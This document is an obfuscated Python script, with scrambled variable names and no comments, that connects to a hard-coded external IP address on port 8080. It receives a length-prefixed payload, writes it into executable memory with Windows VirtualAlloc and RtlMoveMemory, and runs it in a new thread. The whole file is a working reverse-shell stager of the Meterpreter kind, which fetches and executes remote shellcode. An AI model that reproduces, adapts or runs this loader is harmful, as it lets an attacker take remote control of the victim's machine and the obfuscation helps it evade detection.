import struct, socket, binascii, ctypes as YCDujXTuShpNYJ, random, time
jQWlzXjgJaARXA, tUeJHYXZbmpLPI = None, None
def NXPtmMlvqqDc():
	try:
		global tUeJHYXZbmpLPI
		tUeJHYXZbmpLPI = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		tUeJHYXZbmpLPI.connect(('206.189.80.59', 8080))
		oBpdYXECUY = struct.pack('<i', tUeJHYXZbmpLPI.fileno())
		l = struct.unpack('<i', tUeJHYXZbmpLPI.recv(4))[0]
		zzMpmVdoy = b"     "
		while len(zzMpmVdoy) < l: zzMpmVdoy += tUeJHYXZbmpLPI.recv(l)
		oaIHLlxYI = YCDujXTuShpNYJ.create_string_buffer(zzMpmVdoy, len(zzMpmVdoy))
		oaIHLlxYI[0] = binascii.unhexlify('BF')
		for i in range(4): oaIHLlxYI[i+1] = oBpdYXECUY[i]
		return oaIHLlxYI
	except: return None
def YwXUyFFJokXLY(MMumfAaDyHbzsn):
	if MMumfAaDyHbzsn != None:
		cGOLxk = bytearray(MMumfAaDyHbzsn)
		tXhtjfCQ = YCDujXTuShpNYJ.windll.kernel32.VirtualAlloc(YCDujXTuShpNYJ.c_int(0),YCDujXTuShpNYJ.c_int(len(cGOLxk)),YCDujXTuShpNYJ.c_int(0x3000),YCDujXTuShpNYJ.c_int(0x40))
		EJDKwJk = (YCDujXTuShpNYJ.c_char * len(cGOLxk)).from_buffer(cGOLxk)
		YCDujXTuShpNYJ.windll.kernel32.RtlMoveMemory(YCDujXTuShpNYJ.c_int(tXhtjfCQ), EJDKwJk, YCDujXTuShpNYJ.c_int(len(cGOLxk)))
		ht = YCDujXTuShpNYJ.windll.kernel32.CreateThread(YCDujXTuShpNYJ.c_int(0),YCDujXTuShpNYJ.c_int(0),YCDujXTuShpNYJ.c_int(tXhtjfCQ),YCDujXTuShpNYJ.c_int(0),YCDujXTuShpNYJ.c_int(0),YCDujXTuShpNYJ.pointer(YCDujXTuShpNYJ.c_int(0)))
		YCDujXTuShpNYJ.windll.kernel32.WaitForSingleObject(YCDujXTuShpNYJ.c_int(ht),YCDujXTuShpNYJ.c_int(-1))
jQWlzXjgJaARXA = NXPtmMlvqqDc()
YwXUyFFJokXLY(jQWlzXjgJaARXA)
